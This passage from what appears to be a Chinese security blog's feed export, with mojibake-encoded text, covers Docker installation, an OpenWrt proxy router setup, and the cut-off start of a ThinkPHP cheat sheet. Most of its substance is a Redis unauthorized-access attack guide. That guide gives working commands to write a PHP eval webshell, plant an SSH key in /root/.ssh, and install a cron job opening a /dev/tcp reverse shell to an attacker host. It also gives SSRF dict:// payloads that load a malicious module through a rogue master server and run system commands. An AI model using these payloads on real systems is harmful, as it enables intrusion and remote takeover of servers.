/etc/redhat-release</span><br></pre></td></tr></table></figure><p>2.å®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">yum install -y gcc gcc-c++</span><br><span class="line">yum remove docker docker-client docker-client-latest docker-common docker-latest docker-latest-logrotate docker-logrotate docker-engine</span><br><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2 </span><br><span class="line">yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line">yum makecache fast</span><br><span class="line">yum -y install docker-ce docker-ce-cli containerd.io docker-compose</span><br><span class="line">systemctl start docker</span><br><span class="line">systemctl <span class="built_in">enable</span> docker</span><br><span class="line">docker version</span><br><span class="line">docker run hello-world</span><br><span class="line">yum update -y</span><br><span class="line">curl -L https://mirror.ghproxy.com/https://github.com/docker/compose/releases/download/1.23.2/docker-compose-`uname -s`-`uname -m` -o /usr/bin/docker-compose</span><br><span class="line">chmod +x /usr/bin/docker-compose</span><br></pre></td></tr></table></figure><p>3.å¸è½½docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop docker </span><br><span class="line">yum -y remove docker-ce</span><br><span class="line">rm -rf /var/lib/docker</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">åœ¨æˆ‘ä»¬è´­ä¹°vpsæˆ–è€…æ¢æœåŠ¡å™¨ï¼Œè¦å¸¸å¸¸æ­å»ºç¯å¢ƒï¼Œå¦‚pythonã€goã€javaç­‰ï¼Œä»¥åŠåŸºç¡€å·¥å…·ï¼ŒæŒç»­æ›´æ–°~~</summary>
    
    
    
    <category term="vpsç¯å¢ƒ" scheme="https://fz1lin.com/categories/vps%E7%8E%AF%E5%A2%83/"/>
    
    
    <category term="vps" scheme="https://fz1lin.com/tags/vps/"/>
    
    <category term="ç¯å¢ƒ" scheme="https://fz1lin.com/tags/%E7%8E%AF%E5%A2%83/"/>
    
  </entry>
  
  <entry>
    <title>redisæœªæˆæƒè®¿é—®</title>
    <link href="https://fz1lin.com/2022/1972078239/"/>
    <id>https://fz1lin.com/2022/1972078239/</id>
    <published>2022-02-15T12:53:52.000Z</published>
    <updated>2022-05-18T14:28:30.057Z</updated>
    
    <content type="html"><![CDATA[<h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><p>redis ç»‘å®šç«¯å£ 6379ï¼Œä¸”ä»»æ„IPèƒ½è®¿é—®ï¼Œæ— å¯†ç ç›´æ¥ç™»å½• redisï¼Œç™»å½•éœ€è¦åœ¨æœ¬åœ°å®‰è£…redis</p><p>æœ¬åœ°å®‰è£… redis</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br><span class="line">tar xzvf redis-2.8.17.tar.gz </span><br><span class="line"><span class="built_in">cd</span> redis-2.8.17</span><br><span class="line">make</span><br><span class="line"><span class="built_in">cd</span> src</span><br><span class="line">cp redis-server /usr/bin/</span><br><span class="line">cp redis-cli /usr/bin/</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">cp redis.conf /etc/</span><br><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure><p>æµ‹è¯•æœªæˆæƒè®¿é—®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h ç›®æ ‡IP -p 6379</span><br></pre></td></tr></table></figure><h2 id="redis-å†™å…¥-webshell"><a href="#redis-å†™å…¥-webshell" class="headerlink" title="redis å†™å…¥ webshell"></a>redis å†™å…¥ webshell</h2><p>åˆ©ç”¨æ¡ä»¶</p><p>å­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´ï¼Œå¹¶ç™»å½•redisï¼Œéœ€è¦çŸ¥é“ web æœåŠ¡å™¨ç›®å½•ï¼Œå¹¶æœ‰å¢åˆ æ”¹æŸ¥çš„æƒé™</p><blockquote><p>webæœåŠ¡å™¨ç›®å½•ï¼Œéœ€è¦è‡ªå·±æ ¹æ®è·å–è·¯å¾„æ›´æ”¹</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h ç›®æ ‡IP -p 6379</span><br><span class="line">config <span class="built_in">set</span> dir /var/www/html/         <span class="comment"># webæœåŠ¡å™¨ç›®å½•ï¼Œæ›¿æ¢</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\r\n\r\n&lt;?php eval(<span class="variable">$_POST</span>[whoami]);?&gt;\r\n\r\n&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><h2 id="redis-å†™å…¥-SSH"><a href="#redis-å†™å…¥-SSH" class="headerlink" title="redis å†™å…¥ SSH"></a>redis å†™å…¥ SSH</h2><p>åˆ©ç”¨æ¡ä»¶</p><p>å­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´ï¼Œå¹¶ç™»å½•redisï¼Œ.sshç›®å½•æœ‰å†™å…¥çš„æƒé™</p><p>åŸç†</p><p>åŸç†å°±æ˜¯åœ¨æ•°æ®åº“ä¸­æ’å…¥ä¸€æ¡æ•°æ®ï¼Œå°†æœ¬æœºçš„å…¬é’¥ä½œä¸ºvalueï¼Œkeyå€¼éšæ„ï¼Œç„¶åé€šè¿‡ä¿®æ”¹æ•°æ®åº“çš„é»˜è®¤è·¯å¾„ä¸º/root/.sshå’Œé»˜è®¤çš„ç¼“å†²æ–‡ä»¶authorized.keysï¼ŒæŠŠç¼“å†²çš„æ•°æ®ä¿å­˜åœ¨æ–‡ä»¶é‡Œï¼Œè¿™æ ·å°±å¯ä»¥åœ¨æœåŠ¡å™¨ç«¯çš„/root/.sshä¸‹ç”Ÿæˆä¸€ä¸ªæˆæƒçš„keyã€‚</p><p>æ”»å‡»æœº</p><p>ç”Ÿæˆ SSH å¯†é’¥ï¼Œå¯¼å…¥key.txtï¼Œå†æŠŠkey.txtå†™å…¥redis æœåŠ¡å™¨ä¸­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat /root/.ssh/id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; /root/.ssh/key.txt</span><br><span class="line">cat /root/.ssh/key.txt | redis-cli -h ç›®æ ‡IP -x <span class="built_in">set</span> xxx</span><br></pre></td></tr></table></figure><p>ç™»å½• redis å†™å…¥sshï¼Œæ–‡ä»¶åä¸º auth_keys</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h ç›®æ ‡IP</span><br><span class="line">config <span class="built_in">set</span> dir /root/.ssh</span><br><span class="line">config <span class="built_in">set</span> dbfilename auth_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ç™»å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh ç›®æ ‡IP</span><br></pre></td></tr></table></figure><h2 id="redis-å†™å…¥è®¡åˆ’ä»»åŠ¡-è·å–shell"><a href="#redis-å†™å…¥è®¡åˆ’ä»»åŠ¡-è·å–shell" class="headerlink" title="redis å†™å…¥è®¡åˆ’ä»»åŠ¡ è·å–shell"></a>redis å†™å…¥è®¡åˆ’ä»»åŠ¡ è·å–shell</h2><p>æ•°æ®åº“ä¸­æ’å…¥ä¸€æ¡æ•°æ®ï¼Œå°†è®¡åˆ’ä»»åŠ¡çš„å†…å®¹ä½œä¸ºvalueï¼Œkeyå€¼éšæ„ï¼Œç„¶åé€šè¿‡ä¿®æ”¹æ•°æ®åº“çš„é»˜è®¤è·¯å¾„ä¸ºç›®æ ‡ä¸»æœºè®¡åˆ’ä»»åŠ¡çš„è·¯å¾„ï¼ŒæŠŠç¼“å†²çš„æ•°æ®ä¿å­˜åœ¨æ–‡ä»¶é‡Œï¼Œè¿™æ ·å°±å¯ä»¥åœ¨æœåŠ¡å™¨ç«¯æˆåŠŸå†™å…¥ä¸€ä¸ªè®¡åˆ’ä»»åŠ¡è¿›è¡Œåå¼¹shell</p><p>æ”»å‡»æœºä¸Šç›‘å¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 5555</span><br></pre></td></tr></table></figure><p>ç™»å½•ç›®æ ‡ç½‘ç«™</p><blockquote><p>æ ¹æ®ä¸åŒç±»å‹çš„Linuxéœ€è¦æ›´æ”¹è·¯å¾„<br>Centosçš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶åœ¨</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/</span><br></pre></td></tr></table></figure><blockquote><p>Ubuntuå®šæ—¶ä»»åŠ¡æ–‡ä»¶åœ¨</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/crontabs/</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h ç›®æ ‡IP</span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/æ”»å‡»æœºIP/5555 0&gt;&amp;1\n\n&quot;</span></span><br><span class="line">config <span class="built_in">set</span> dir /var/spool/cron/crontabs/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>ç¨ç­‰ç‰‡åˆ»ï¼Œå³å¯åå¼¹</p><h2 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h2><ul><li><p>  å¯†ç éªŒè¯</p></li><li><p>  é™æƒè¿â¾</p></li><li><p>  é™åˆ¶ ip / ä¿®æ”¹ç«¯â¼</p></li></ul><p><a href="https://www.runoob.com/redis/redis-install.html" title="https://www.runoob.com/redis/redis-install.html">https://www.runoob.com/redis/redis-install.html</a></p><h2 id="SSRFåˆ©ç”¨Redis-å†™shell"><a href="#SSRFåˆ©ç”¨Redis-å†™shell" class="headerlink" title="SSRFåˆ©ç”¨Redis å†™shell"></a>SSRFåˆ©ç”¨Redis å†™shell</h2><p>ä¸ä¸€å®šæ˜¯ssrf ä¹Ÿå¯ä»¥æ˜¯ spring ä¹‹ç±»çš„ï¼Œåªè¦èƒ½è·å–åˆ°redisè´¦å·å¯†ç å°±è¡Œã€‚</p><h3 id="SSRF-è·å–çœŸå®IP"><a href="#SSRF-è·å–çœŸå®IP" class="headerlink" title="SSRF è·å–çœŸå®IP"></a>SSRF è·å–çœŸå®IP</h3><p>vps ç›‘å¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp <span class="number">1234</span></span><br></pre></td></tr></table></figure><p>ssrf æ¼æ´åˆ©ç”¨ç‚¹è¯·æ±‚æœåŠ¡å™¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1234</span></span><br></pre></td></tr></table></figure><p>å»æœåŠ¡å™¨ä¸Šçœ‹å¯ä»¥çœ‹åˆ°çœŸå®IP</p><p>åˆ©ç”¨dictæ¢æµ‹redis</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="built_in">dict</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span></span><br></pre></td></tr></table></figure><p>å‘ç°å¼€æ”¾ redis æœåŠ¡</p><p>è·å–ç½‘ç«™ç»å¯¹è·¯å¾„å¦‚æœæ˜¯ å¯ä»¥æ ¹æ®ç½‘ç«™ç‰¹æ€§è·å–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/www/wwwroot/hx4_triangle/application</span><br></pre></td></tr></table></figure><h3 id="redis-åˆ©ç”¨ä¸»ä»å¤åˆ¶çº¯å‡€æ–‡ä»¶"><a href="#redis-åˆ©ç”¨ä¸»ä»å¤åˆ¶çº¯å‡€æ–‡ä»¶" class="headerlink" title="redis åˆ©ç”¨ä¸»ä»å¤åˆ¶çº¯å‡€æ–‡ä»¶"></a>redis åˆ©ç”¨ä¸»ä»å¤åˆ¶çº¯å‡€æ–‡ä»¶</h3><p><img src="/2022/1972078239/image_QN7QV4HYNQ.png"></p><h3 id="redisæœåŠ¡å™¨å†™å…¥shell"><a href="#redisæœåŠ¡å™¨å†™å…¥shell" class="headerlink" title="redisæœåŠ¡å™¨å†™å…¥shell"></a>redisæœåŠ¡å™¨å†™å…¥shell</h3><p>ä¸»æœåŠ¡å™¨æ­å»º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install epel-release</span><br><span class="line">sudo yum -y install redis</span><br><span class="line">sudo systemctl start redis</span><br><span class="line"></span><br><span class="line">vi /etc/redis.conf</span><br><span class="line"><span class="comment">#ä¿®æ”¹é…ç½®æ–‡ä»¶ redis.conf</span></span><br><span class="line">bind <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å°†redisé»˜è®¤çš„å®ˆæŠ¤å…³é—­</span></span><br><span class="line">protected-mode yes ä¿®æ”¹ä¸º </span><br><span class="line">protected-mode no</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sudo systemctl restart redis</span><br><span class="line">systemctl stop firewalld </span><br></pre></td></tr></table></figure><p>å†™shell</p><p>æœ¬åœ°redis å†™å…¥&#x20;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line"><span class="built_in">set</span> phpshell <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flushall æ¸…ç©ºkeys*</span></span><br><span class="line"><span class="comment"># å†™shellçš„ phpshellä¸ºåå­—</span></span><br></pre></td></tr></table></figure><p>ssrfç›®æ ‡æœåŠ¡å™¨å†™å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">config:<span class="built_in">set</span>:<span class="built_in">dir</span>:/www/wwwroot/runtime/</span><br><span class="line">config:<span class="built_in">set</span>:dbfilename <span class="number">1.</span>php</span><br><span class="line">slaveof:<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>:<span class="number">6379</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æŒ‡å®šè·¯å¾„</span></span><br><span class="line"><span class="comment">#ä¿®æ”¹æ–‡ä»¶å</span></span><br><span class="line"><span class="comment">#è¿æ¥æœåŠ¡å™¨</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>èšå‰‘è¿æ¥</p><h3 id="ä½¿ç”¨redisåˆ©ç”¨å·¥å…·"><a href="#ä½¿ç”¨redisåˆ©ç”¨å·¥å…·" class="headerlink" title="ä½¿ç”¨redisåˆ©ç”¨å·¥å…·"></a>ä½¿ç”¨redisåˆ©ç”¨å·¥å…·</h3><p>vps ä¸‹è½½åˆ©ç”¨å·¥å…·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server.git</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd Awsome-Redis-Rogue-Server/</span><br><span class="line">python3 redis_rogue_server.py -v -path <span class="number">1.</span>php <span class="comment"># 1.php ä¸ºè‡ªå·±å†™çš„é©¬å­</span></span><br></pre></td></tr></table></figure><p>ç”¨dictå†™shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config get <span class="built_in">dir</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/lib/redis</span><br><span class="line">config <span class="built_in">set</span> dbfilename test.php</span><br></pre></td></tr></table></figure><h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis_rogue_server.py -v -path module.so</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹å½“å‰redisçš„ç›¸å…³é…ç½®</span></span><br><span class="line">ssrf.php?url=<span class="built_in">dict</span>://<span class="number">172.16</span><span class="number">.186</span><span class="number">.4</span>:<span class="number">6379</span>/info</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®å¤‡ä»½æ–‡ä»¶å</span></span><br><span class="line">ssrf.php?url=<span class="built_in">dict</span>://<span class="number">172.16</span><span class="number">.186</span><span class="number">.4</span>:<span class="number">6379</span>/config:<span class="built_in">set</span>:dbfilename:exp.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿æ¥æ¶æ„RedisæœåŠ¡å™¨</span></span><br><span class="line">ssrf.php?url=<span class="built_in">dict</span>://<span class="number">172.16</span><span class="number">.186</span><span class="number">.4</span>:<span class="number">6379</span>/slaveof:<span class="number">192.168</span><span class="number">.0</span><span class="number">.107</span>:<span class="number">1234</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½æ¶æ„æ¨¡å—</span></span><br><span class="line">ssrf.php?url=<span class="built_in">dict</span>://<span class="number">172.16</span><span class="number">.186</span><span class="number">.4</span>:<span class="number">6379</span>/module:load:./exp.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ‡æ–­ä¸»ä»å¤åˆ¶</span></span><br><span class="line">ssrf.php?url=<span class="built_in">dict</span>://<span class="number">172.16</span><span class="number">.186</span><span class="number">.4</span>:<span class="number">6379</span>/slaveof:no:one</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span></span><br><span class="line"> ssrf.php?url=<span class="built_in">dict</span>://<span class="number">172.16</span><span class="number">.186</span><span class="number">.4</span>:<span class="number">6379</span>/redisruntime.rev:<span class="number">192.168</span><span class="number">.0</span><span class="number">.107</span>:<span class="number">1234</span></span><br></pre></td></tr></table></figure><p><a href="https://juejin.cn/post/6860666710920265741" title="https://juejin.cn/post/6860666710920265741">https://juejin.cn/post/6860666710920265741</a></p><p><a href="https://www.t00ls.cc/articles-56339.html" title="https://www.t00ls.cc/articles-56339.html">https://www.t00ls.cc/articles-56339.html</a></p>]]></content>
    
    
    <summary type="html">redis 6379 æ‰“ç‚¹æ€è·¯</summary>
    
    
    
    <category term="çº¢é˜Ÿæ‰“ç‚¹" scheme="https://fz1lin.com/categories/%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9/"/>
    
    
    <category term="Redis" scheme="https://fz1lin.com/tags/Redis/"/>
    
    <category term="æœªæˆæƒè®¿é—®" scheme="https://fz1lin.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    
  </entry>
  
  <entry>
    <title>N1 è½¯è·¯ç”±åˆ· openwrt</title>
    <link href="https://fz1lin.com/2022/1386849462/"/>
    <id>https://fz1lin.com/2022/1386849462/</id>
    <published>2022-05-15T08:23:53.000Z</published>
    <updated>2022-05-15T08:44:01.659Z</updated>
    
    <content type="html"><![CDATA[<p>è§£å†³é—®é¢˜ï¼š</p><p>ç”¨äºå‡ºå·®éšèº«æºå¸¦ï¼Œå®ç°ç§‘å­¦ä¸Šç½‘ï¼Œæ‰€æœ‰æµé‡èµ°è·¯ç”±å™¨ï¼Œè€Œä¸æ˜¯æœ¬æœºä»£ç†ï¼Œæœ‰äº›æ‰«æå™¨æˆ–è€…è½¯ä»¶ï¼Œæƒé™é«˜ï¼Œä¸èµ°å…¨å±€ä»£ç†ï¼Œå®¹æ˜“æ¼IPï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä»è·¯ç”±ä¸Šè§£å†³ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨openwrtèµ°æ—è·¯ç”±ï¼Œä¸è¿‡æœ¬æ•™ç¨‹åªæ˜¯ä¸­ç»§ï¼Œåç»­å‡ºæ—è·¯ç”±å§ï¼Œæœ¬æ•™ç¨‹ä»…ç”¨äºå®‰å…¨ç ”ç©¶ä»¥æŠ€æœ¯äº¤æµï¼Œé€ æˆçš„åæœä½¿ç”¨è€…è´Ÿè´£ã€‚</p><p>è®¾å¤‡ï¼šæ–è®¯ N1</p><h2 id="N1-åˆ·openwrt-x20"><a href="#N1-åˆ·openwrt-x20" class="headerlink" title="N1 åˆ·openwrt&#x20;"></a>N1 åˆ·openwrt&#x20;</h2><p>å›ºä»¶ï¼š<a href="https://www.aliyundrive.com/s/KhSCHkTZeei" title="https://www.aliyundrive.com/s/KhSCHkTZeei">https://www.aliyundrive.com/s/KhSCHkTZeei</a>   æå–ç : 34ei</p><p>N1åˆ·openwrtæ•™ç¨‹ï¼š<a href="http://readme.jimostudio.link:9000/?id=57" title="http://readme.jimostudio.link:9000/?id=57">http://readme.jimostudio.link:9000/?id=57</a></p><h2 id="æ‹“æ‰‘å›¾"><a href="#æ‹“æ‰‘å›¾" class="headerlink" title="æ‹“æ‰‘å›¾"></a>æ‹“æ‰‘å›¾</h2><p><img src="/2022/1386849462/N1%E6%8B%93%E6%89%91%E5%9B%BE_2lqmA54YCH.png"></p><h2 id="N1-è½¯è·¯ç”±æ— çº¿ä¸­ç»§æ¨¡å¼"><a href="#N1-è½¯è·¯ç”±æ— çº¿ä¸­ç»§æ¨¡å¼" class="headerlink" title="N1 è½¯è·¯ç”±æ— çº¿ä¸­ç»§æ¨¡å¼"></a>N1 è½¯è·¯ç”±æ— çº¿ä¸­ç»§æ¨¡å¼</h2><p>è¿›å…¥åå°</p><p><a href="http://192.168.1.100/cgi-bin/luci/" title="http://192.168.1.100/">http://192.168.1.100/</a></p><p>è´¦å· root å¯†ç password</p><p>æ— çº¿ä¸­ç»§æ¨¡å¼</p><p>ç‚¹å‡»æ‰«æ</p><p><img src="/2022/1386849462/image_U6B37R4C2w.png"></p><p>åŠ å…¥ç½‘ç»œ</p><p><img src="/2022/1386849462/image_C0O29wzD14.png"></p><p>è¾“å…¥å¯†ç -æäº¤</p><p><img src="/2022/1386849462/image_-lLoSzcQzW.png"></p><p>é€‰æ‹©æ¥å£ LAN ä¹Ÿå°±æ˜¯ç½‘çº¿çš„é‚£ä¸ªå£ï¼Œè®¾ç½®DNS è®¿é—®ç™¾åº¦æµ‹è¯•</p><p><img src="/2022/1386849462/image_4xNFMVx9Ky.png"></p><p>æµ‹è¯•æˆåŠŸè¯´æ˜è·¯ç”±èµ°è·¯ç”±å™¨äº†</p><h2 id="ç§‘å­¦ä¸Šç½‘"><a href="#ç§‘å­¦ä¸Šç½‘" class="headerlink" title="ç§‘å­¦ä¸Šç½‘"></a>ç§‘å­¦ä¸Šç½‘</h2><p><img src="/2022/1386849462/image_CNNX3hA7-u.png"></p><p>éœ€è¦è‡ªå·±å‡†å¤‡æœºåœºåˆ—è¡¨</p><p>ç‚¹å‡»æ·»åŠ -å¯ç”¨å‹¾é€‰-å¤‡æ³¨éšä¾¿å¡«-æŠŠè®¢é˜…è¿æ¥æ·»åŠ ä¸Šé¢-ä¿å­˜åº”ç”¨-æ‰‹åŠ¨è®¢é˜…</p><p><img src="/2022/1386849462/image_kI3glymSHL.png"></p><p>ä¸»å¼€å…³å‹¾é€‰ -é€‰æ‹©è‡ªå·±æœºåœºçš„èŠ‚ç‚¹</p><p><img src="/2022/1386849462/image_M4MHkVycxc.png"></p><p>è¿™é‡Œæ ¹æ®è‡ªå·±çš„å–œå¥½ï¼Œæ›´æ”¹ä»£ç†æ¨¡å¼</p><p><img src="/2022/1386849462/image_w7Xsim2z1Z.png"></p><p>è®¿é—® <a href="http://ip111.cn/" title="http://ip111.cn/">http://ip111.cn/</a></p><p><img src="/2022/1386849462/image_AfGPD46ypu.png"></p><h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><p>å¦‚æœæœªç”Ÿæ•ˆé‡å¯ä¸€ä¸‹è·¯ç”±æˆ–è€…ç¦ç”¨å¯ç”¨ä¸€ä¸‹ç½‘å¡</p>]]></content>
    
    
    <summary type="html">å‘Šåˆ«windows èµ°æœ¬åœ°ä»£ç†ï¼Œå®ç°è·¯ç”±å™¨èµ°å…¨å±€ä»£ç†ï¼Œä¸­ç»§æ¨¡å¼ï¼Œå‡ºå·®ä¾¿æº</summary>
    
    
    
    <category term="è½¯è·¯ç”±" scheme="https://fz1lin.com/categories/%E8%BD%AF%E8%B7%AF%E7%94%B1/"/>
    
    
    <category term="N1" scheme="https://fz1lin.com/tags/N1/"/>
    
    <category term="Router" scheme="https://fz1lin.com/tags/Router/"/>
    
    <category term="openwrt" scheme="https://fz1lin.com/tags/openwrt/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 3.x ï¼Œ5.x æ¼æ´é€ŸæŸ¥</title>
    <link href="https://fz1lin.com/2022/429639226/"/>
    <id>https://fz1lin.com/2022/429639226/</id>
    <published>2022-02-20T08:40:53.000Z</published>
    <updated>2022-02-20T08:56:46.750Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ThinkPHP-ç‰ˆæœ¬æ¢æµ‹"><a href="#ThinkPHP-ç‰ˆæœ¬æ¢æµ‹" class="headerlink" title="ThinkPHP ç‰ˆæœ¬æ¢æµ‹"></a>ThinkPHP ç‰ˆæœ¬æ¢æµ‹</h2><p>ä½¿ç”¨æµè§ˆå™¨æ’ä»¶åˆ¤æ–­æ˜¯ ThinkPHP </p><p><img src="/2022/429639226/image-20220218132319732.png" alt="image-20220218132319732"> </p><p>æäº¤ä»»æ„å­—ç¬¦ï¼Œä¼šçˆ†å‡ºæ¡†æ¶ç‰ˆæœ¬</p><p> <img src="/2022/429639226/image-20220218134539894.png" alt="image-20220218134539894"> </p><p>å¦‚æœç‰ˆæœ¬éšè—ï¼Œå¯ä»¥è€ƒè™‘ç›²æ‰“ã€‚ä½¿ç”¨payloadå³å¯ï¼Œä½œä¸ºæ‰“ç‚¹æ¼æ´ï¼Œéœ€è¦çŸ¥é“ï¼Œè¯¥æ¼æ´æ˜¯å¦æœ‰åˆ©ç”¨é¢ï¼Œä¹Ÿå°±æ˜¯è¿›ä¸€æ­¥çš„æ·±å…¥ï¼Œèƒ½å¦è·å–å†…ç½‘è·å–æƒé™ã€‚</p><h2 id="ThinkPHP-3-2-3-æ¼æ´"><a href="#ThinkPHP-3-2-3-æ¼æ´" class="headerlink" title="ThinkPHP 3.2.3 æ¼æ´"></a>ThinkPHP 3.2.3 æ¼æ´</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//u</span>rl<span 